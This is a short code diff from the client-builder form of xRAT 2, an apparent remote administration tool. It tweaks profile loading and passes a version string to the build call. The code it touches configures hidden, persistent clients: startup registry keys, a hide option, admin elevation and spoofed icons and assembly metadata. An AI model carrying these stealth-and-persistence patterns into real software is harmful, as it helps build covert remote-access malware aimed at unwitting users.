@@ -31,9 +31,7 @@ namespace xRAT_2.Forms
             txtRegistryKeyName.Text = pm.ReadValue("RegistryName");
             chkElevation.Checked = bool.Parse(pm.ReadValue("AdminElevation"));
             chkIconChange.Checked = bool.Parse(pm.ReadValue("ChangeIcon"));
-
-            // new profile options - fallback for old version
-            chkChangeAsmInfo.Checked = bool.Parse((!string.IsNullOrEmpty(pm.ReadValue("ChangeAsmInfo"))) ? pm.ReadValue("ChangeAsmInfo") : "False");
+            chkChangeAsmInfo.Checked = bool.Parse(pm.ReadValue("ChangeAsmInfo"));
             txtProductName.Text = pm.ReadValue("ProductName");
             txtDescription.Text = pm.ReadValue("Description");
             txtCompanyName.Text = pm.ReadValue("CompanyName");
@@ -255,7 +253,7 @@ namespace xRAT_2.Forms
                                     asmInfo[6] = txtProductVersion.Text;
                                     asmInfo[7] = txtFileVersion.Text;
                                 }
-                                ClientBuilder.Build(output, txtHost.Text, txtPassword.Text, txtInstallsub.Text, txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked, chkHide.Checked, int.Parse(txtPort.Text), int.Parse(txtDelay.Text), GetInstallpath(), chkElevation.Checked, icon, asmInfo);
+                                ClientBuilder.Build(output, txtHost.Text, txtPassword.Text, txtInstallsub.Text, txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked, chkHide.Checked, int.Parse(txtPort.Text), int.Parse(txtDelay.Text), GetInstallpath(), chkElevation.Checked, icon, asmInfo, Application.ProductVersion);
                                 MessageBox.Show("Successfully built client!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                             }
                             catch (Exception ex)
